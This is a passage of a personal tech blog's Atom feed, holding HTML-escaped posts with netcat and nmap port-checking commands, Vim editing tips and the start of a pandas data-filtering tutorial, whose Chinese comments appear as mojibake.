&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ‰«æç«¯å£ 22 æ˜¯å¦å·²æ‰“å¼€&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -z : sets nc to simply scan for listening daemons, without actually sending any data to them.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -v : enables verbose mode&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -zv 192.168.1.15 &lt;span class="m">22&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ‰«æå¤šä¸ªç«¯å£&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -zv 192.168.56.10 &lt;span class="m">80&lt;/span> &lt;span class="m">22&lt;/span> &lt;span class="m">21&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -zv 192.168.56.10 20-80
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¯åŠ¨ 8888 ç«¯å£çš„ udp ç›‘å¬&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -ulp &lt;span class="m">8888&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ£€æŸ¥ udp ç«¯å£æ˜¯å¦æ­£å¸¸&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -zvu localhost &lt;span class="m">8888&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="nmap">NMAP&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç«¯å£æ‰«æ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap -Pn 172.19.50.218
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></content><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/network/" term="Network" label="Network"/><category scheme="https://mincodes.com/tags/linux/" term="Linux" label="Linux"/></entry><entry><title type="text">Vim Tips</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/vim-tips/"/><id>https://mincodes.com/posts/vim-tips/</id><updated>2023-02-28T11:43:00+00:00</updated><published>2022-09-26T10:59:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">regexp ç›¸å…³ 1 2 3 4 5 6 7 8 # ç»Ÿè®¡æ­£åˆ™åŒ¹é…åˆ°çš„æ¬¡æ•° :%s/pattern//ng # åˆ©ç”¨ global æŠŠåŒ¹é…åˆ°çš„è¡Œæ‰“å°å‡ºæ¥ :global/pattern/print # æˆ–è€… :global/pattern æ—¥å¿—è¿‡æ»¤ global 1 2 3â€¦</summary><content type="html">&lt;h2 id="regexp-ç›¸å…³">regexp ç›¸å…³&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç»Ÿè®¡æ­£åˆ™åŒ¹é…åˆ°çš„æ¬¡æ•°&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:%s/pattern//ng
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ©ç”¨ global æŠŠåŒ¹é…åˆ°çš„è¡Œæ‰“å°å‡ºæ¥&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:global/pattern/print
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æˆ–è€…&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:global/pattern
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="æ—¥å¿—è¿‡æ»¤">æ—¥å¿—è¿‡æ»¤&lt;/h2>
&lt;h3 id="global">global&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="n">elete&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">all&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">lines&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">not&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">matching&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">patterns&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="k">g&lt;/span>&lt;span class="o">!/&lt;/span>&lt;span class="n">pattern&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">pattern&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">åŒ¹é…å¤šä¸ªå•è¯&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">onStart&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">onStop&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">å¿½ç•¥å¤§å°å†™ï¼Œå¯ä»¥ç›´æ¥&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="k">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ignorecase&lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="err">ï¼Œæˆ–è€…ï¼š&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">å¼ºåˆ¶å¿½ç•¥å¤§å°å†™ï¼š\&lt;/span>&lt;span class="k">c&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="k">g&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="n">cpattern&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">z&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">echo&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;================================&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">å¼ºåˆ¶åŒ¹é…å¤§å°å†™ï¼š\&lt;/span>&lt;span class="k">C&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="k">g&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="n">Cpattern&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">z&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">echo&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;================================&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">æ›´å¤šä¿¡æ¯å¯æŸ¥çœ‹å¸®åŠ©&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">help&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ignorecase&lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">å°†åŒ¹é…çš„è¡Œç§»åŠ¨åˆ°æœ€åå—&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="k">g&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">pattern&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">m0&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">å°†åŒ¹é…çš„è¡Œç§»åŠ¨åˆ°æœ€å‰é¢ï¼ˆé¡ºåºä¼šå˜æˆå€’åºï¼‰&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="k">g&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">pat&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">m$&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">å±•ç¤ºåŒ¹é…è¯¥æ­£åˆ™è¡¨è¾¾å¼çš„åˆ—è¡¨&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="k">g&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">regular&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">expression&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="i-ilist">[I, ilist&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Display&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">all&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">lines&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">that&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">contain&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">keyword&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">under&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">cursor&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">I&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Like&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;[I&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;]I&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">but&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">search&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">range&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">lines&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">default&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">whole&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">il&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">pattern1&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">patter2&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">pattern3&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="quickfix-location-list">quickfix, location list&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="n">vimgrep&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">pattern&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">lvim&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">pattern&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="æ–‡ä»¶ç¼–è¾‘ç›¸å…³">æ–‡ä»¶ç¼–è¾‘ç›¸å…³&lt;/h2>
&lt;h3 id="json-æ ¼å¼åŒ–">Json æ ¼å¼åŒ–&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># V é€‰ä¸­ json å­—ç¬¦ä¸²ï¼Œç„¶åè°ƒç”¨ json.tool æ ¼å¼åŒ– json å­—ç¬¦ä¸²&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;,&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="err">!&lt;/span>&lt;span class="n">python3&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">m&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tool&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="äºŒè¿›åˆ¶ç¼–è¾‘">äºŒè¿›åˆ¶ç¼–è¾‘&lt;/h3>
&lt;p>ä½¿ç”¨ &lt;code>xxd&lt;/code> å‘½ä»¤ï¼Œåˆ‡æ¢åˆ°äºŒè¿›åˆ¶æ¨¡å¼ï¼š &lt;code>:%!xxd&lt;/code>&lt;/p>
&lt;p>é€€å‡ºäºŒè¿›åˆ¶æ¨¡å¼ï¼š &lt;code>:%!xxd -r&lt;/code>&lt;/p>
&lt;h3 id="ä½¿ç”¨æŒ‡å®šçš„-encoding-é‡æ–°åŠ è½½æ–‡ä»¶">ä½¿ç”¨æŒ‡å®šçš„ encoding é‡æ–°åŠ è½½æ–‡ä»¶&lt;/h3>
&lt;p>&lt;code>:e ++enc=gbk&lt;/code>&lt;/p>
&lt;h2 id="æœç´¢">æœç´¢&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æœç´¢æ—¶ä½¿ç”¨æ™ºèƒ½å¤§å°å†™&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> ignorecase smartcase
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¢é‡æœç´¢ï¼Œå…‰æ ‡è‡ªåŠ¨è·³è½¬åˆ°åŒ¹é…çš„ä½ç½®&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> incsearch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="é…ç½®ç›¸å…³">é…ç½®ç›¸å…³&lt;/h2>
&lt;h3 id="é‡æ–°åŠ è½½-vimrc">é‡æ–°åŠ è½½ .vimrc&lt;/h3>
&lt;p>é…ç½®ä¿®æ”¹åï¼Œæ‰§è¡Œ &lt;code>:source ~/.vimrc&lt;/code> å³å¯ç”Ÿæ•ˆã€‚&lt;/p></content><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/editor/" term="Editor" label="Editor"/></entry><entry><title type="text">Python Pandas</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/python-pandas/"/><id>https://mincodes.com/posts/python-pandas/</id><updated>2023-01-12T09:32:00+00:00</updated><published>2022-09-05T07:00:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">ç®€å•ä»»åŠ¡ æ•°æ®è¯»å– 1 2 3 4 5 6 7 8 import pandas as pd df = pd.read_csv(&amp;#39;data/android/oom-sessions/oom.csv&amp;#39;) # thousands=&amp;#39;,&amp;#39; å¯ä»¥è‡ªåŠ¨å°†ç±»ä¼¼ &amp;#34;1,316&amp;#34; æ ¼å¼çš„æ•°å­—è½¬æ¢ä¸ºæ•´æ•° df = pd.read_csv(&amp;#39;ui-90.csv&amp;#39;, thousands=&amp;#39;,&amp;#39;) df.head() æ•°æ®â€¦</summary><content type="html">&lt;h2 id="ç®€å•ä»»åŠ¡">ç®€å•ä»»åŠ¡&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>æ•°æ®è¯»å–&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">import pandas as pd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> pd.read_csv&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;data/android/oom-sessions/oom.csv&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># thousands=&amp;#39;,&amp;#39; å¯ä»¥è‡ªåŠ¨å°†ç±»ä¼¼ &amp;#34;1,316&amp;#34; æ ¼å¼çš„æ•°å­—è½¬æ¢ä¸ºæ•´æ•°&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> pd.read_csv&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;ui-90.csv&amp;#39;&lt;/span>, &lt;span class="nv">thousands&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;,&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">df.head&lt;span class="o">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>æ•°æ®è¿‡æ»¤&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> df&lt;span class="o">[&lt;/span>df&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="o">]==&lt;/span>&lt;span class="s1">&amp;#39;ThreadPoolForeg&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç»„åˆå¤šä¸ªæ¡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> df&lt;span class="o">[(&lt;/span>df.p_date &amp;gt;&lt;span class="o">=&lt;/span> 20220830&lt;span class="o">)&lt;/span> &lt;span class="p">&amp;amp;&lt;/span> &lt;span class="o">(&lt;/span>df&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;count&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span> &amp;gt;&lt;span class="o">=&lt;/span> 200&lt;span class="o">)]&lt;/span>
